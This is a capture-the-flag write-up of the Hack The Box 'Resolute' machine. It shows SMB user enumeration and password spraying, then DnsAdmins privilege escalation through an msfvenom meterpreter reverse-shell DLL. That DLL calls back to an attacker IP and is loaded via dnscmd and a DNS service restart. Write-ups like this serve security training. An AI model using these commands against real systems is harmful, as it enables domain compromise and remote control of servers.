
Resolute windows machine from HTB:

Starting with the typical nmap port scanning to reveal the listening ports:

<img width="780" alt="Screenshot 2019-12-09 at 01 21 39" src="https://user-images.githubusercontent.com/47299364/70399232-773e4000-1a22-11ea-9bd9-b370b0a24501.png">

SMB is opened, let's try to reveral some users using metasploit with smb_enumusers:

<img width="1398" alt="Screenshot 2019-12-09 at 01 21 58" src="https://user-images.githubusercontent.com/47299364/70399240-89b87980-1a22-11ea-8b63-5631b8240fe9.png">

Cool, some users:

MEGABANK [ Administrator, Guest, krbtgt, DefaultAccount, ryan, marko, sunita, abigail, marcus, sally, fred, angela, felicia, gustavo, ulf, stevie, claire, paulo, steve, annette, annika, per, claude, melanie, zach, simon, naoki, kdoos ] ( LockoutTries=0 PasswordMin=7 )

Let's try to enumerate a bit more to see if we can get some hidden info for the users:

enum4linux -U -o 10.10.10.169

<img width="885" alt="Screenshot 2019-12-09 at 01 47 59" src="https://user-images.githubusercontent.com/47299364/70399641-17499880-1a26-11ea-9538-7844a1f4f91c.png">

<img width="966" alt="Screenshot 2019-12-09 at 01 48 24" src="https://user-images.githubusercontent.com/47299364/70399650-2af4ff00-1a26-11ea-95f7-c46639944714.png">

Cool, looks like we have the password for the user marko:Welcome123!

After trying it, no success with user marko.

Although this looks like a general password, let's bruteforce it in the other users.

Gotcha, this password also works for user melanie:

<img width="690" alt="Screenshot 2019-12-09 at 03 07 34" src="https://user-images.githubusercontent.com/47299364/70401729-326dd580-1a31-11ea-819d-7d015d568440.png">

let's use evil-winrm to connect to the machine:

<img width="745" alt="Screenshot 2019-12-09 at 03 11 09" src="https://user-images.githubusercontent.com/47299364/70401856-9bede400-1a31-11ea-999a-d6fd7c940591.png">

Cool, user flag is accomplished:

<img width="547" alt="Screenshot 2019-12-09 at 03 13 12" src="https://user-images.githubusercontent.com/47299364/70401937-e66f6080-1a31-11ea-8ad7-88e92203eaa7.png">

After having the melanie user i tried to look for ryan credentials. simply ran findstr /s /i ryan *.* in C:\ which revealed some files that contained the ryan's password:

<img width="1391" alt="Screenshot 2019-12-09 at 23 16 45" src="https://user-images.githubusercontent.com/47299364/70489379-e89df180-1afb-11ea-840d-19eec1a6435f.png">

Now that we have the password, let's login as ryan:

<img width="642" alt="Screenshot 2019-12-09 at 23 44 14" src="https://user-images.githubusercontent.com/47299364/70489416-05d2c000-1afc-11ea-8d32-8ea77ec8e092.png">

ryan belongs to some interesting groups, the most interesting one is DnsAdmins which can lead to privilege escalation(https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)

<img width="1179" alt="Screenshot 2019-12-09 at 23 53 52" src="https://user-images.githubusercontent.com/47299364/70489512-48949800-1afc-11ea-87dc-aed0b956d186.png">

So the way this exploit works is, you need to craft a specific .dll which can be then loaded using dnscmd. Once that's done, the dns service needs to be restarted so this .dll get's picked up and executed.

Let's craft our dll payload using msfvenon in order to generate a reverse shell back to us. For this i will also setup the metasploit reverse shell, an smbserver for the AD to download the dll file:

msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.121 LPORT=8080 -f dll > shell-cmd.dll

smbserver.py share /tmp

<img width="1202" alt="Screenshot 2019-12-10 at 03 13 21" src="https://user-images.githubusercontent.com/47299364/70489621-990bf580-1afc-11ea-9462-9ad0b15944b6.png">

<img width="1402" alt="Screenshot 2019-12-10 at 03 13 41" src="https://user-images.githubusercontent.com/47299364/70489637-a628e480-1afc-11ea-98fb-94f09b371006.png">

<img width="711" alt="Screenshot 2019-12-10 at 03 14 06" src="https://user-images.githubusercontent.com/47299364/70489658-b17c1000-1afc-11ea-81cf-7934528b481a.png">

Once all of this is setup, we just need to run the dnscmd command in the server and restart the dns service too:

dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.15.121\share\shell-cmd.dll

sc.exe \\10.10.10.169 start dns

<img width="934" alt="Screenshot 2019-12-10 at 03 14 33" src="https://user-images.githubusercontent.com/47299364/70489718-d2dcfc00-1afc-11ea-8d3b-8a016e803d1c.png">

Once this is done, we get a reverse shell back in our metasploit session as Administrator :)

<img width="787" alt="Screenshot 2019-12-10 at 03 15 05" src="https://user-images.githubusercontent.com/47299364/70489760-ebe5ad00-1afc-11ea-805c-da9884755b73.png">

and voila, root flag:

<img width="713" alt="Screenshot 2019-12-10 at 03 15 19" src="https://user-images.githubusercontent.com/47299364/70489804-028c0400-1afd-11ea-8885-21df5e99db50.png">
